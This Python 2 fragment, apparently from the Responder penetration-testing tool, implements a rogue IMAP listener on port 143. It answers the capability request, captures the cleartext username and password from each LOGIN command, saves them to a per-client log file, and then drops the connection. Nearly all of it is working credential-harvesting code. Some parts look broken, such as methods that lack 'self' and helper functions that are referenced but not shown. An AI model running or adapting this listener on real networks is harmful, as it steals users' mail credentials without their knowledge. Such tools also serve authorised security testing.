##################################################################################
#IMAP4 Stuff starts here
##################################################################################


class IMAPServer():

	def serve_thread_tcp(host, port, handler):
		try:
			server = ThreadingTCPServer((host, port), handler)
			server.serve_forever()
		except Exception, e:
			print "Error starting TCP server on port %s: %s:" % (str(port),str(e))

	#Function name self-explanatory
	def start(IMAP_On_Off):
		if IMAP_On_Off == "ON":
			t = threading.Thread(name="IMAP", target=self.serve_thread_tcp, args=("0.0.0.0", 143,IMAP))
			t.setDaemon(True)
			t.start()

		if IMAP_On_Off == "OFF":
			return False

class ThreadingTCPServer(ThreadingMixIn, TCPServer):

	allow_reuse_address = 1

	def server_bind(self):
		TCPServer.server_bind(self)

#ESMTP server class.
class IMAP(BaseRequestHandler):

	def handle(self):
		try:
			self.request.send(str(IMAPGreating()))
			data = self.request.recv(1024)
			if data[5:15] == "CAPABILITY":
				RequestTag = data[0:4]
				self.request.send(str(IMAPCapability()))
				self.request.send(str(IMAPCapabilityEnd(Tag=RequestTag)))
				data = self.request.recv(1024)
			if data[5:10] == "LOGIN":
				Credentials = data[10:].strip()
				Outfile = "./logs/responder/IMAP-Clear-Text-Password-"+self.client_address[0]+".txt"
				WriteData(Outfile,Credentials, Credentials)
				#print '[+]IMAP Credentials from %s. ("User" "Pass"): %s'%(self.client_address[0],Credentials)
				responder_logger.info('[+]IMAP Credentials from %s. ("User" "Pass"): %s'%(self.client_address[0],Credentials))
				self.request.send(str(ditchthisconnection()))
				data = self.request.recv(1024)

		except Exception:
			pass

##################################################################################
#IMAP4 Stuff ends here
##################################################################################